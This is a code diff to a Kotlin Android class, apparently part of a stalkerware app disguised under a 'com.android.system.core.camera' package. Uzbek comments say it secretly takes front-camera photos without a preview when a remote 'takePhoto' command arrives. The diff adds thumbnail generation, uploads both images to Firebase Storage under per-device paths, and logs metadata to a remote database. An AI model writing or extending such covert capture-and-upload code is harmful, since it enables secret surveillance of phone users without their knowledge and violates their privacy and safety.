@@ -2,6 +2,8 @@ package com.android.system.core.camera
 
 import android.annotation.SuppressLint
 import android.content.Context
+import android.graphics.Bitmap
+import android.graphics.BitmapFactory
 import android.graphics.ImageFormat
 import android.hardware.camera2.CameraCaptureSession
 import android.hardware.camera2.CameraCharacteristics
@@ -22,8 +24,9 @@ import java.io.ByteArrayOutputStream
 /**
  * Camera2 API orqali yashirin foto olish.
  * Front kameradan preview ko'rsatmasdan foto oladi.
- * Firebase Storage ga yuklaydi: snapshots/{uid}/{timestamp}.jpg
- * Firebase RTDB ga yozadi: devices/{uid}/status/lastSnapshot = timestamp
+ * Firebase Storage ga yuklaydi: snapshots/{uid}/{timestamp}.jpg (asl)
+ * va snapshots/{uid}/{timestamp}_thumb.jpg (kichraytirilgan).
+ * Firebase RTDB ga yozadi: devices/{uid}/snapshots/{timestamp} = { storagePath, thumbPath, timestamp }
  *
  * Trigger: command type "takePhoto"
  * Android 14: foregroundServiceType="camera" shart.
@@ -182,35 +185,39 @@ class CameraSnapshotWorker(private val context: Context) {
     }
 
     /**
-     * Firebase Storage ga foto yuklash
+     * Firebase Storage ga foto yuklash.
+     * Avval asl rasm, keyin kichraytirilgan thumbnail yuklanadi,
+     * so'ng RTDB ga metadata yoziladi.
      */
     private fun uploadToFirebase(uid: String, imageBytes: ByteArray, onComplete: (Boolean) -> Unit) {
         try {
             val timestamp = System.currentTimeMillis()
             val storagePath = "snapshots/$uid/$timestamp.jpg"
+            val thumbPath = "snapshots/$uid/${timestamp}_thumb.jpg"
 
-            val storageRef = FirebaseStorage.getInstance().reference.child(storagePath)
+            val storage = FirebaseStorage.getInstance()
+            val storageRef = storage.reference.child(storagePath)
 
             storageRef.putBytes(imageBytes)
                 .addOnSuccessListener {
                     if (BuildConfig.DEBUG) { Log.d(TAG, "Photo uploaded to: $storagePath") }
 
-                    // RTDB ga lastSnapshot yozish
-                    FirebaseDatabase.getInstance(FIREBASE_URL)
-                        .getReference("devices")
-                        .child(uid)
-                        .child("status")
-                        .child("lastSnapshot")
-                        .setValue(timestamp)
+                    val thumbBytes = generateThumbnail(imageBytes)
+                    if (thumbBytes == null) {
+                        // Thumbnail yarata olmadik - jiddiy emas, bo'sh thumbPath bilan davom etamiz
+                        writeSnapshotMetadata(uid, timestamp, storagePath, "", onComplete)
+                        return@addOnSuccessListener
+                    }
+
+                    storage.reference.child(thumbPath).putBytes(thumbBytes)
                         .addOnSuccessListener {
-                            if (BuildConfig.DEBUG) { Log.d(TAG, "lastSnapshot updated: $timestamp") }
-                            onComplete(true)
-                            cleanup()
+                            if (BuildConfig.DEBUG) { Log.d(TAG, "Thumbnail uploaded to: $thumbPath") }
+                            writeSnapshotMetadata(uid, timestamp, storagePath, thumbPath, onComplete)
                         }
                         .addOnFailureListener { e ->
-                            if (BuildConfig.DEBUG) { Log.e(TAG, "lastSnapshot update failed: ${e.message}") }
-                            onComplete(true) // foto yuklandi, faqat RTDB yozish xato
-                            cleanup()
+                            if (BuildConfig.DEBUG) { Log.e(TAG, "Thumbnail upload failed: ${e.message}") }
+                            // Thumbnail yuklanmadi - jiddiy emas, bo'sh thumbPath bilan davom etamiz
+                            writeSnapshotMetadata(uid, timestamp, storagePath, "", onComplete)
                         }
                 }
                 .addOnFailureListener { e ->
@@ -223,6 +230,58 @@ class CameraSnapshotWorker(private val context: Context) {
             onComplete(false)
             cleanup()
         }
+    }
+
+    /**
+     * Asl JPEG dan 200x200 ga kichraytirilgan thumbnail yaratadi (JPEG, sifat 70).
+     * Xatolik bo'lsa null qaytaradi.
+     */
+    private fun generateThumbnail(imageBytes: ByteArray): ByteArray? {
+        return try {
+            val original = BitmapFactory.decodeByteArray(imageBytes, 0, imageBytes.size) ?: return null
+            val thumb = Bitmap.createScaledBitmap(original, 200, 200, true)
+            val out = ByteArrayOutputStream()
+            thumb.compress(Bitmap.CompressFormat.JPEG, 70, out)
+            original.recycle()
+            thumb.recycle()
+            out.toByteArray()
+        } catch (e: Exception) {
+            if (BuildConfig.DEBUG) { Log.e(TAG, "Thumbnail generation error: ${e.message}") }
+            null
+        }
+    }
+
+    /**
+     * RTDB ga snapshot metadata yozadi: devices/{uid}/snapshots/{timestamp}.
+     */
+    private fun writeSnapshotMetadata(
+        uid: String,
+        timestamp: Long,
+        storagePath: String,
+        thumbPath: String,
+        onComplete: (Boolean) -> Unit
+    ) {
+        val metadata = mapOf(
+            "storagePath" to storagePath,
+            "thumbPath" to thumbPath,
+            "timestamp" to timestamp
+        )
+        FirebaseDatabase.getInstance(FIREBASE_URL)
+            .getReference("devices")
+            .child(uid)
+            .child("snapshots")
+            .child(timestamp.toString())
+            .setValue(metadata)
+            .addOnSuccessListener {
+                if (BuildConfig.DEBUG) { Log.d(TAG, "Snapshot metadata written: $timestamp") }
+                onComplete(true)
+                cleanup()
+            }
+            .addOnFailureListener { e ->
+                if (BuildConfig.DEBUG) { Log.e(TAG, "Snapshot metadata write failed: ${e.message}") }
+                onComplete(true) // foto yuklandi, faqat RTDB yozish xato
+                cleanup()
+            }
     }
 
     /**
